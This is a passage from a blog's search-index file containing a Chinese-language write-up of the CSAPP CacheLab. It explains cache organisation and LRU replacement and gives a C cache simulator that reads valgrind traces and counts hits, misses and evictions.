<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>CSAPP——CacheLab</title>
    <link href="/2023/10/16/CSAPP%E2%80%94%E2%80%94CacheLab/"/>
    <url>/2023/10/16/CSAPP%E2%80%94%E2%80%94CacheLab/</url>
    
    <content type="html"><![CDATA[<h2 id="实验概述"><a href="#实验概述" class="headerlink" title="实验概述"></a>实验概述</h2><p>本实验将帮助我们了解缓存对C语言性能的影响，在做实验之前我首先将教材第六章看了一遍，大致对缓存的知识有了些概念，在此先贴点基础知识。</p><p><strong>存储器层次结构</strong>：<br><img src="/images/cache-1.png"></p><p><strong>高速缓存cache 结构</strong>：<br><img src="/images/cache-2.png"></p><p>Cache 类似于一个二维数组，它有 2^S 组，每组有 E 行，每行存储的字节也是固定的。其中，每行都有一个有效位，和一个标记位。想要查找到对应的字节，我们的地址需要三部分组成：</p><pre><code class="hljs">    s，索引位，找到对应的组序号    tag，标记位，在组中的每一行进行匹配，判断能否命中    b，块偏移，表明在找到的行中的具体位置。本实验不考虑块便宜，完全可以忽略。</code></pre><p>那么，Cache 中的有效位是干什么的呢？判断该行是否为空。这里有一个概念：<strong>冷不命中</strong>，表示该缓存块为空造成的不命中。而一旦确定不命中不是冷不命中，那么就需要考虑行替换的问题了。我认为，行替换关乎着 Cache 的效率，是 Cache 设计的核心, 本实验采用<strong>LRU（最近最少使用）</strong>替换策略。</p><h3 id="Part-A-Writing-a-Cache-Simulator"><a href="#Part-A-Writing-a-Cache-Simulator" class="headerlink" title="Part A: Writing a Cache Simulator"></a>Part A: Writing a Cache Simulator</h3><p>在 A 部分中，您将在 csim.c 中编写一个缓存模拟器，它将 valgrind 内存跟踪作为输入，在此跟踪上模拟高速缓存的命中&#x2F;未命中行为，并输出命中，未命中和驱逐总数。实验为我们提供了参考缓存模拟器的二进制可执行文件，称为 csim-ref，它在 valgrind 跟踪文件上模拟具有任意大小和关联性的缓存行为。 它使用选择要逐出的缓存行时的 <strong>LRU（最近最少使用）</strong>替换策略。<br>具体来说，需要用c语言写一个程序csim.c， 这个程序的表现需要和csim-ref一样，也就是模仿一个cache的行为，当然不用模仿全部行为，我们只需要让csim.c能对<strong>S(Store)、L(Load)、M(Modify) <strong>这三种类型的地址操作，表现出相应的</strong>MISS、HIT、EVICTION</strong>（命中，未命中，驱赶）即可。</p><h4 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h4><ol><li>工作目录是cachelab-handout，进到目录推荐先：make clean &amp;&amp; make</li><li>将修改的文件是: csim.c</li><li>检测方法是： make &amp;&amp; .&#x2F;test-csim</li><li>满分是27分</li></ol><h4 id="代码及解释"><a href="#代码及解释" class="headerlink" title="代码及解释"></a>代码及解释</h4><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * A Cache Simulator by Deconx</span><br><span class="hljs-comment"> * 2022/3/19</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;cachelab.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;getopt.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;limits.h&gt;</span></span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">cache_line</span><br>&#123;<br>    <span class="hljs-type">int</span> valid;     <span class="hljs-comment">//有效位</span><br>    <span class="hljs-type">int</span> tag;       <span class="hljs-comment">//标记位</span><br>    <span class="hljs-type">int</span> time_tamp; <span class="hljs-comment">//时间戳</span><br>&#125; Cache_line;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">cache_</span><br>&#123;<br>    <span class="hljs-type">int</span> S;<br>    <span class="hljs-type">int</span> E;<br>    <span class="hljs-type">int</span> B;<br>    Cache_line **line;<br>&#125; Cache;<br><br><span class="hljs-type">int</span> hit_count = <span class="hljs-number">0</span>, miss_count = <span class="hljs-number">0</span>, eviction_count = <span class="hljs-number">0</span>; <span class="hljs-comment">// 记录冲突不命中、缓存不命中</span><br><span class="hljs-type">int</span> verbose = <span class="hljs-number">0</span>;                                       <span class="hljs-comment">//是否打印详细信息</span><br><span class="hljs-type">char</span> t[<span class="hljs-number">1000</span>];<br>Cache *cache = <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Init_Cache</span><span class="hljs-params">(<span class="hljs-type">int</span> s, <span class="hljs-type">int</span> E, <span class="hljs-type">int</span> b)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> S = <span class="hljs-number">1</span> &lt;&lt; s;<br>    <span class="hljs-type">int</span> B = <span class="hljs-number">1</span> &lt;&lt; b;<br>    cache = (Cache *)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(Cache));<br>    cache-&gt;S = S;<br>    cache-&gt;E = E;<br>    cache-&gt;B = B;<br>    cache-&gt;line = (Cache_line **)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(Cache_line *) * S);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; S; i++)<br>    &#123;<br>        cache-&gt;line[i] = (Cache_line *)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(Cache_line) * E);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; E; j++)<br>        &#123;<br>            cache-&gt;line[i][j].valid = <span class="hljs-number">0</span>; <span class="hljs-comment">//初始时，高速缓存是空的</span><br>            cache-&gt;line[i][j].tag = <span class="hljs-number">-1</span>;<br>            cache-&gt;line[i][j].time_tamp = <span class="hljs-number">0</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">free_Cache</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> S = cache-&gt;S;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; S; i++)<br>    &#123;<br>        <span class="hljs-built_in">free</span>(cache-&gt;line[i]);<br>    &#125;<br>    <span class="hljs-built_in">free</span>(cache-&gt;line);<br>    <span class="hljs-built_in">free</span>(cache);<br>&#125;<br><br><span class="hljs-comment">//判断是miss还是hit</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">get_index</span><span class="hljs-params">(<span class="hljs-type">int</span> op_s, <span class="hljs-type">int</span> op_tag)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; cache-&gt;E; i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (cache-&gt;line[op_s][i].valid &amp;&amp; cache-&gt;line[op_s][i].tag == op_tag)<br>            <span class="hljs-keyword">return</span> i;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br><span class="hljs-comment">//替换时间戳最大的行</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">find_LRU</span><span class="hljs-params">(<span class="hljs-type">int</span> op_s)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> max_index = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> max_stamp = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; cache-&gt;E; i++)&#123;<br>        <span class="hljs-keyword">if</span>(cache-&gt;line[op_s][i].time_tamp &gt; max_stamp)&#123;<br>            max_stamp = cache-&gt;line[op_s][i].time_tamp;<br>            max_index = i;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> max_index;<br>&#125;<br><br><span class="hljs-comment">//判断组是否行全满</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">is_full</span><span class="hljs-params">(<span class="hljs-type">int</span> op_s)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; cache-&gt;E; i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (cache-&gt;line[op_s][i].valid == <span class="hljs-number">0</span>)<br>            <span class="hljs-keyword">return</span> i;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br><span class="hljs-comment">//将缓存行标记为有效，设置标记和时间戳，然后更新其他缓存行的时间戳。</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">update</span><span class="hljs-params">(<span class="hljs-type">int</span> i, <span class="hljs-type">int</span> op_s, <span class="hljs-type">int</span> op_tag)</span></span>&#123;<br>    cache-&gt;line[op_s][i].valid=<span class="hljs-number">1</span>;<br>    cache-&gt;line[op_s][i].tag = op_tag;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> k = <span class="hljs-number">0</span>; k &lt; cache-&gt;E; k++)<br>        <span class="hljs-keyword">if</span>(cache-&gt;line[op_s][k].valid==<span class="hljs-number">1</span>)<br>            cache-&gt;line[op_s][k].time_tamp++;<br>    cache-&gt;line[op_s][i].time_tamp = <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//根据访问的标记和组，更新缓存信息，包括命中、不命中和可能的驱逐。如果发生缓存不命中，该函数将根据LRU策略选择要替换的缓存行。</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">update_info</span><span class="hljs-params">(<span class="hljs-type">int</span> op_tag, <span class="hljs-type">int</span> op_s)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> index = <span class="hljs-built_in">get_index</span>(op_s, op_tag);<br>    <span class="hljs-keyword">if</span> (index == <span class="hljs-number">-1</span>)<br>    &#123;<br>        miss_count++;<br>        <span class="hljs-keyword">if</span> (verbose)<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;miss &quot;</span>);<br>        <span class="hljs-type">int</span> i = <span class="hljs-built_in">is_full</span>(op_s);<br>        <span class="hljs-keyword">if</span>(i==<span class="hljs-number">-1</span>)&#123;<br>            eviction_count++;<br>            <span class="hljs-keyword">if</span>(verbose) <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;eviction&quot;</span>);<br>            i = <span class="hljs-built_in">find_LRU</span>(op_s);<br>        &#125;<br>        <span class="hljs-built_in">update</span>(i,op_s,op_tag);<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        hit_count++;<br>        <span class="hljs-keyword">if</span>(verbose)<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hit&quot;</span>);<br>        <span class="hljs-built_in">update</span>(index,op_s,op_tag);    <br>    &#125;<br>&#125;<br><span class="hljs-comment">//读取跟踪文件并模拟缓存访问。它打开指定的跟踪文件，解析每一行的操作，计算标记和组索引，然后根据操作类型调用 update_info 函数来更新缓存状态。</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">get_trace</span><span class="hljs-params">(<span class="hljs-type">int</span> s, <span class="hljs-type">int</span> E, <span class="hljs-type">int</span> b)</span></span><br><span class="hljs-function"></span>&#123;<br>    FILE *pFile;<br>    pFile = <span class="hljs-built_in">fopen</span>(t, <span class="hljs-string">&quot;r&quot;</span>);<br>    <span class="hljs-keyword">if</span> (pFile == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-type">char</span> identifier;<br>    <span class="hljs-type">unsigned</span> address;<br>    <span class="hljs-type">int</span> size;<br>    <span class="hljs-comment">// Reading lines like &quot; M 20,1&quot; or &quot;L 19,3&quot;</span><br>    <span class="hljs-keyword">while</span> (<span class="hljs-built_in">fscanf</span>(pFile, <span class="hljs-string">&quot; %c %x,%d&quot;</span>, &amp;identifier, &amp;address, &amp;size) &gt; <span class="hljs-number">0</span>) <span class="hljs-comment">// I读不进来,忽略---size没啥用</span><br>    &#123;<br>        <span class="hljs-comment">//想办法先得到标记位和组序号</span><br>        <span class="hljs-type">int</span> op_tag = address &gt;&gt; (s + b);<br>        <span class="hljs-type">int</span> op_s = (address &gt;&gt; b) &amp; ((<span class="hljs-type">unsigned</span>)(<span class="hljs-number">-1</span>) &gt;&gt; (<span class="hljs-number">8</span> * <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">unsigned</span>) - s));<br>        <span class="hljs-keyword">switch</span> (identifier)<br>        &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;M&#x27;</span>: <span class="hljs-comment">//一次存储一次加载</span><br>            <span class="hljs-built_in">update_info</span>(op_tag, op_s);<br>            <span class="hljs-built_in">update_info</span>(op_tag, op_s);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;L&#x27;</span>:<br>            <span class="hljs-built_in">update_info</span>(op_tag, op_s);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;S&#x27;</span>:<br>            <span class="hljs-built_in">update_info</span>(op_tag, op_s);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">fclose</span>(pFile);<br>&#125;<br><span class="hljs-comment">//打印程序的帮助信息，显示如何使用程序的参数和选项。</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">print_help</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;** A Cache Simulator by Deconx\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Usage: ./csim-ref [-hv] -s &lt;num&gt; -E &lt;num&gt; -b &lt;num&gt; -t &lt;file&gt;\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Options:\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;-h         Print this help message.\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;-v         Optional verbose flag.\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;-s &lt;num&gt;   Number of set index bits.\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;-E &lt;num&gt;   Number of lines per set.\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;-b &lt;num&gt;   Number of block offset bits.\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;-t &lt;file&gt;  Trace file.\n\n\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Examples:\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;linux&gt;  ./csim -s 4 -E 1 -b 4 -t traces/yi.trace\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;linux&gt;  ./csim -v -s 8 -E 2 -b 4 -t traces/yi.trace\n&quot;</span>);<br>&#125;<br><span class="hljs-comment">//处理程序的命令行参数，包括高速缓存的参数（s、E、b）和跟踪文件名。然后，它初始化高速缓存，模拟缓存访问，最后输出命中、不命中和驱逐的统计信息。</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">char</span> opt;<br>    <span class="hljs-type">int</span> s, E, b;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * s:S=2^s是组的个数</span><br><span class="hljs-comment">     * E:每组中有多少行</span><br><span class="hljs-comment">     * b:B=2^b每个缓冲块的字节数</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">-1</span> != (opt = <span class="hljs-built_in">getopt</span>(argc, argv, <span class="hljs-string">&quot;hvs:E:b:t:&quot;</span>)))<br>    &#123;<br>        <span class="hljs-keyword">switch</span> (opt)<br>        &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;h&#x27;</span>:<br>            <span class="hljs-built_in">print_help</span>();<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;v&#x27;</span>:<br>            verbose = <span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;s&#x27;</span>:<br>            s = <span class="hljs-built_in">atoi</span>(optarg);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;E&#x27;</span>:<br>            E = <span class="hljs-built_in">atoi</span>(optarg);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;b&#x27;</span>:<br>            b = <span class="hljs-built_in">atoi</span>(optarg);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;t&#x27;</span>:<br>            <span class="hljs-built_in">strcpy</span>(t, optarg);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>            <span class="hljs-built_in">print_help</span>();<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">Init_Cache</span>(s, E, b); <span class="hljs-comment">//初始化一个cache</span><br>    <span class="hljs-built_in">get_trace</span>(s, E, b);<br>    <span class="hljs-built_in">free_Cache</span>();<br>    <span class="hljs-comment">// printSummary(hit_count, miss_count, eviction_count)</span><br>    <span class="hljs-built_in">printSummary</span>(hit_count, miss_count, eviction_count);  <span class="hljs-comment">//由 cachelab.h 文件提供</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>1. 定义Cache结构体</strong></p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">cache_</span><br>&#123;<br>    <span class="hljs-type">int</span> S;<br>    <span class="hljs-type">int</span> E;<br>    <span class="hljs-type">int</span> B;<br>    Cache_line **line;<br>&#125; Cache;<br></code></pre></td></tr></table></figure><p>用Cache表示一个缓存，它包括 S, B, E 等特征，以及前面说过的，每一个缓存类似于一个二位数组，数组的每一个元素就是缓存中的行所以用一个line来表示这一信息：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">cache_line</span><br>&#123;<br>    <span class="hljs-type">int</span> valid;     <span class="hljs-comment">//有效位</span><br>    <span class="hljs-type">int</span> tag;       <span class="hljs-comment">//标记位</span><br>    <span class="hljs-type">int</span> time_tamp; <span class="hljs-comment">//时间戳</span><br>&#125; Cache_line;<br></code></pre></td></tr></table></figure><p><strong>2. LRU 时间戳实现</strong></p><p>在Init_Cache函数中，</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">cache-&gt;line[i][j].time_tamp <span class="hljs-operator">=</span> <span class="hljs-number">0</span><span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>时间戳初始设置为0。时间戳越大则表示该行最后访问的时间越久远。</p><p>LRU 更新的代码：</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xl">void update(int i, int op_s, int op_tag)&#123;<br>    <span class="hljs-function"><span class="hljs-title">cache</span>-&gt;</span>line[op_s][i].valid=<span class="hljs-number">1</span>;<br>    <span class="hljs-function"><span class="hljs-title">cache</span>-&gt;</span>line[op_s][i].tag = op_tag;<br>    <span class="hljs-function"><span class="hljs-title">for</span>(int k = 0; k &lt; cache-&gt;</span>E; k++)<br>        <span class="hljs-function"><span class="hljs-title">if</span>(cache-&gt;</span>line[op_s][k].valid==<span class="hljs-number">1</span>)<br>            <span class="hljs-function"><span class="hljs-title">cache</span>-&gt;</span>line[op_s][k].time_tamp++;<br>    <span class="hljs-function"><span class="hljs-title">cache</span>-&gt;</span>line[op_s][i].time_tamp = <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这段代码在找到要进行的操作行后调用（无论是不命中还是命中，还是驱逐后）。前两行是对有效位和标志位的设置，与时间戳无关，主要关注后几行：</p><pre><code class="hljs">    遍历组中每一行，并将它们的值加1，也就是说每一行在进行一次操作后时间戳都会变大，表示它离最后操作的时间变久    将本次操作的行时间戳设置为最小，也就是0</code></pre><p>由此，每次只需要找到时间戳最大的行进行替换就可以了：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs abnf">int find_LRU(int op_s)<br>&#123;<br>    int max_index <span class="hljs-operator">=</span> <span class="hljs-number">0</span><span class="hljs-comment">;</span><br>    int max_stamp <span class="hljs-operator">=</span> <span class="hljs-number">0</span><span class="hljs-comment">;</span><br>    for(int i <span class="hljs-operator">=</span> <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; cache-&gt;E; i++)&#123;</span><br>        if(cache-&gt;line[op_s][i].time_tamp &gt; max_stamp)&#123;<br>            max_stamp <span class="hljs-operator">=</span> cache-&gt;line[op_s][i].time_tamp<span class="hljs-comment">;</span><br>            max_index <span class="hljs-operator">=</span> i<span class="hljs-comment">;</span><br>        &#125;<br>    &#125;<br>    return max_index<span class="hljs-comment">;</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>3. 缓存搜索及更新</strong></p><p>在得知要操作的组op_s以及标志位op_tag后，判断是miss还是hit还是应该eviction调用find_LRU.</p><p>get_index(int op_s, int op_tag)用于判断是miss还是hit：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">get_index</span><span class="hljs-params">(<span class="hljs-type">int</span> op_s, <span class="hljs-type">int</span> op_tag)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; cache-&gt;E; i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (cache-&gt;line[op_s][i].valid &amp;&amp; cache-&gt;line[op_s][i].tag == op_tag)<br>            <span class="hljs-keyword">return</span> i;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>遍历所有行，如果某一行有效，且标志位相同，则hit，返回该索引。否则，miss，返回 -1。当接收到-1后，有两种情况：</p><pre><code class="hljs">    冷不命中。组中有空行，只不过还未操作过，有效位为0，找到这个空行即可    所有行都满了。那么就要用到上面得 LRU 